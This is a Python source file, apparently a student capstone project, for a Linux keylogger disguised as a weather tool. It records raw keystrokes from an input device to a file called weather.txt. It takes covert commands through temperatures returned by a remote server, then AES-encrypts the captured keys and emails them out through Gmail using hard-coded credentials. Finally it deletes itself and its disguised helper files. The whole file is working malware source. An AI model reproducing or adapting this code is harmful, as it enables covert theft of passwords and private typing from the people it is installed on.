import struct
import threading
import requests
import time
import os
import sys
import smtplib
from Crypto.Cipher import AES
from email.mime.text import MIMEText

key_codes = [
    "RESERVED",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "MINUS",
    "EQUAL",
    "BACKSPACE",
    "TAB",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "LEFTBRACE",
    "RIGHTBRACE",
    "ENTER",
    "LEFTCTRL",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "SEMICOLON",
    "APOSTROPHE",
    "GRAVE",
    "LEFTSHIFT",
    "BACKSLASH",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "COMMA",
    "DOT",
    "SLASH",
    "RIGHTSHIFT",
    "KPASTERISK",
    "LEFTALT",
    "SPACE",
    "CAPSLOCK",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NUMLOCK",
    "SCROLLLOCK"
]

paused = threading.Event()
kill = threading.Event()

def keylogger():

    infile_path = "/dev/input/event1"

    FORMAT = 'llHHI'
    EVENT_SIZE = struct.calcsize(FORMAT)

    in_file = open(infile_path, "rb")

    event = in_file.read(EVENT_SIZE)

    while event:

        if kill.is_set():
            in_file.close()
            return

        (tv_sec, tv_usec, type, code, value) = struct.unpack(FORMAT, event)

        if not paused.is_set():
            if type == 1 and value == 0:
                if code < len(key_codes):
                    with open(sys.argv[3] + "weather.txt", "a+") as f:
                        f.write(key_codes[code] + "\n")
        else:
            paused.wait()

        event = in_file.read(EVENT_SIZE)


def http_listen():

    request_data = {
        'city': 'Amherst',
        'date': '2024-05-07'
    }

    while True:
        url = "http://" + sys.argv[1] + ":5001/weather"
        try:
            response = requests.post(url, json=request_data)

            if response.status_code == 200:
                weather = response.json()
                temp = weather['weather']['temperature']
                temp = int(temp[:-2])

                if temp > 32 and temp <= 70:
                    paused.clear()
                elif temp <= 32 and temp > 0:
                    paused.set()
                elif temp > 70:
                    kill.set()
                    return
                elif temp <= 0:

                    subject = "Weather Data"
                    sender = "capstone92831@gmail.com"
                    recipient = sys.argv[2]
                    password = "bhxc bdgq vzir edib"
                    text = ""

                    with open(sys.argv[3] + "weather.txt", "r") as f:
                        text = f.read()

                    aes = AES.new(b"capstonepassword", AES.MODE_CFB, iv=b"564initialvector")
                    ciphertext = aes.encrypt(text.encode("utf8"))

                    msg = MIMEText(f"{ciphertext}")
                    msg['Subject'] = subject
                    msg['From'] = sender
                    msg['To'] = recipient
                    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
                        smtp_server.login(sender, password)
                        smtp_server.sendmail(sender, recipient, msg.as_string())

        except requests.exceptions.RequestException as e:
            pass

        time.sleep(10)



if __name__ == "__main__":
    keylog_thread = threading.Thread(target=keylogger)
    keylog_thread.start()

    http_thread = threading.Thread(target=http_listen)
    http_thread.start()

    keylog_thread.join()
    http_thread.join()

    os.remove(sys.argv[3] + "weather.txt")
    os.remove("/usr/local/bin/weather.sh")
    os.remove("/usr/sbin/weatherInfo")
    os.remove("/usr/sbin/weatherArg")
    os.remove(sys.argv[0])

